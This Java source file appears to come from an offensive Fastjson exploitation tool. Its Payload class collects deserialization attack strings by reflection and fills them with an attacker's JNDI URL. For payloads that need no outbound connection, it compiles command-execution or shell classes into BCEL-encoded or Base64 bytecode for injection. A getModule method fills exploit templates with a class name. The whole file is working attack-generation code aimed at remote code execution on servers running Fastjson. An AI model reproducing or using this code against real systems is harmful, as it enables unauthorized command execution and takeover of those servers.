package com.fastjsontool.exploit.payload;

import com.fastjsontool.exploit.Info;

import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Base64;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import javassist.ClassPool;
import javassist.CtClass;

public class Payload {

    public static ArrayList<String> getPayload(String jndiURL) {
        ArrayList<String> payloads = new ArrayList<>();
        try {
            Class<?> aClass = Class.forName("com.fastjsontool.exploit.payload.Payloads"); //通过反射获取全部的payload
            Object o = aClass.newInstance();
            Field[] declaredFields = aClass.getDeclaredFields(); //获取全部属性
            for (Field f : declaredFields) {
                f.setAccessible(true);
                String payload = (String) f.get(o);
                if (f.getName().contains("payload0")){  //不出网payload
                    ClassPool aDefault = ClassPool.getDefault();
                    CtClass ctClass=null;
                    if(Info.cmd .equals("cmd")){
                        ctClass = aDefault.get(cmd_Bcel.class.getName());
                    }else if(Info.cmd.equals("shell")){
                        ctClass=aDefault.get(shell_Bcel.class.getName());
                    }
                    String encode = null;
                    if (f.getName().equals("payload0")){
                        encode = "$$BCEL$$"+Utility.encode(ctClass.toBytecode(),true);
                    }else {
                        encode = Base64.getEncoder().encodeToString(ctClass.toBytecode());
                    }
                    payloads.add(String.format(payload,encode));
                }else {
                    payloads.add(String.format(payload, jndiURL));  //将jndi地址填充进入payload当中
                }
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
        return payloads;
    }

    public static String getModule(String module) {  //返回模板
        try {
            Class<?> aClass = Class.forName("com.fastjsontool.exploit.payload.Modules");
            Object o = aClass.newInstance();
            Field declaredField = aClass.getDeclaredField(module);
            declaredField.setAccessible(true);
            String context = (String) declaredField.get(o);
            return String.format(context, Info.className);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }
}
